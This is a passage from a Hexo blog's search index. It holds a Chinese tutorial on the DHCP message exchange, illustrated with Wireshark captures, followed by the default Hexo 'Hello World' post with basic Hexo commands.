Inform</code>报文：0x08</h3><blockquote><p>在client已经获得了IP地址，需要从server端获得更详细的配置信息时，就会发送DHCP-INFORM报文向server请求，server在收到这个报文后，会根据租约查找，找到相应的配置信息后，就会回应DHCP-ACK报文给client。</p></blockquote><hr><h3 id="4-DHCP工作过程"><a href="#4-DHCP工作过程" class="headerlink" title="(4)DHCP工作过程"></a>(4)DHCP工作过程</h3><ol><li>客户端通过<code>广播</code>发送<code>DHCP Discover</code>报文<code>寻找DHCP服务端</code>。</li><li>服务端通过<code>单播</code>发送<code>DHCP Offer</code>报文向客户端<code>提供从地址池中挑选的可用IP等网络信息</code>。</li><li>客户端<code>只接收第一个收到的DHCP Offer报文</code>并<code>提取IP地址</code>，然后向通过<code>广播</code>发送<code>DHCP Request</code>报文告知<code>服务端要使用该IP地址</code>。</li><li>服务端通过<code>单播</code>发送<code>DHCP ACK</code>报文告知客户端<code>该IP地址是合法可用的，并提供租约信息</code>。</li></ol><blockquote><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626095948173-1489540212.png"><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626091113912-207253523.png"></p></blockquote><blockquote><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626090621635-1056664789.png"></p></blockquote><hr><h2 id="二、DHCP动态获取IP地址"><a href="#二、DHCP动态获取IP地址" class="headerlink" title="二、DHCP动态获取IP地址"></a>二、DHCP动态获取IP地址</h2><blockquote><p>DHCP动态获取IP地址的过程主要分为<code>发现Discover阶段</code>、<code>提供Offer阶段</code>、<code>选择Request阶段</code>、<code>确认ACK阶段</code>四个阶段。</p></blockquote><hr><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240625/383b1ad12029826203fb60a3a0c9988f8524.jpeg"></p></blockquote><h3 id="1-发现Discover阶段："><a href="#1-发现Discover阶段：" class="headerlink" title="(1)发现Discover阶段："></a>(1)<code>发现Discover阶段：</code></h3><blockquote><p>client端在局域网内以广播的方式发起一个<code>DHCP Discover广播报文</code>，目的是在子网络中发现能够给client端提供IP地址的server端。</p></blockquote><blockquote><p>特别要注意到的是，PC会随机出一个Transaction ID，如果之后收到的Offer报文中的Transaction ID与PC模拟出的不同，PC会将该Offer报文直接丢弃。</p></blockquote><blockquote><blockquote><p>UDP 目标端口号为67    源IP地址：0.0.0.0    目的IP地址：255.255.255.255</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240625/2af2ff4d089208213c793cdee4601a492893.jpeg"></p></blockquote><hr><h3 id="2-提供Offer阶段："><a href="#2-提供Offer阶段：" class="headerlink" title="(2)提供Offer阶段："></a>(2)<code>提供Offer阶段：</code></h3><blockquote><p>局域网中DHCP server接受到Discover包之后，通过发送<code>DHCP offer</code>包给client端应答，主要是<code>告知client端可以提供IP地址，以及相应的IP地址租约信息和其他配置信息</code>也会在其中。</p></blockquote><blockquote><blockquote><p>UDP 目标端口号为68    源IP地址：172.22.192.1    目的IP地址：172.22.194.142</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/1e9b99baade846ff7adf6664f3f7b4502091.jpeg"></p></blockquote><blockquote><blockquote><p>DHCP Offer报文中<code>Your(Client) IP Address</code>字段就是<code>DHCP Server能够提供给DHCP Client使用的IP地址</code>，且DHCP Server会将自己的IP地址放在option字段中<code>以便``DHCP Client``区分不同的``DHCP Server</code>。</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/67ed2b59165024abcec484804a89d13b1333.jpeg"></p></blockquote><hr><h3 id="3-选择Request阶段："><a href="#3-选择Request阶段：" class="headerlink" title="(3)选择Request阶段："></a>(3)选择Request阶段：</h3><blockquote><p>在client端可能会接受到多个offer包，通常clientdaunt<code>只会接受收到的第一个DHCP offer报文</code>，然后client端就会以<code>广播的方式发送一个DHCP request报文请求分配IP地址</code>。</p></blockquote><blockquote><blockquote><p>UDP 目标67    源IP为0.0.0.0   目的IP:255.255.255.255</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/6be0cef8dd138bed0cf40a7e3e25b71e5974.jpeg"></p></blockquote><blockquote><blockquote><p>DHCP Client只能处理其中的一个DHCP Offer报文，一般的原则是DHCP Client处理<code>最先收到的``DHCP Offer``报文</code>。DHCP Client会发出一个广播的DHCP <code>Request</code>报文，在<code>选项字段中会加入选中的``DHCP Server``的``IP``地址和需要的``IP``地址</code>。</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/718a2638b6cdafa1d34270d9f7d204242624.jpeg"></p></blockquote><hr><h3 id="4-确认ACK阶段："><a href="#4-确认ACK阶段：" class="headerlink" title="(4)确认ACK阶段："></a>(4)确认ACK阶段：</h3><blockquote><p>server端在收到DHCP request报文之后，<code>会判断option字段的serverIP地址是否是自己的IP地址</code>，如果<code>符合分配IP地址的条件，就会给client发送一个DHCP ACK包</code>，如果<code>不满足就发挥发送一个DHCP NAK 包</code>。</p></blockquote><blockquote><blockquote><p>DHCP Server收到DHCP Request报文后，<code>判断选项字段中的``IP``地址是否与自己的地址相同</code>。<code>如果不相同，``DHCP Server``不做任何处理只清除相应``IP``地址分配记录</code>；如果相同，DHCP Server就会向DHCP Client响应一个DHCP ACK报文，并在选项字段中增加IP地址的使用租期信息。</p></blockquote></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/a5bc7d7483be508c11ca08850920dd4e5637.jpeg"></p></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240626/5864b6ce2a39d1b54e3c2031aa150b671871.jpeg"></p></blockquote><hr><h3 id="5-DHCP-Release"><a href="#5-DHCP-Release" class="headerlink" title="(5)DHCP Release"></a>(5)DHCP Release</h3><blockquote><blockquote><p>DHCP Client在成功获取IP地址后，<code>随时可以通过发送DHCP Release报文释放自己的IP地址</code>，DHCP Server收到DHCP Release报文后，<code>会回收相应的``IP地址并重新分配</code>。</p></blockquote></blockquote><blockquote><p>图中的5个报文，其中<code>DHCP Release</code>报文为PC释放IP时发出的报文。</p></blockquote><blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/240625/4e5ba75c42e3fb9b71b755488c07b3a1350.jpeg"></p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark抓包 </tag>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/3eeb.html"/>
      <url>/posts/3eeb.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 博文 </category>
          
          <category> 日常记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hello World </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
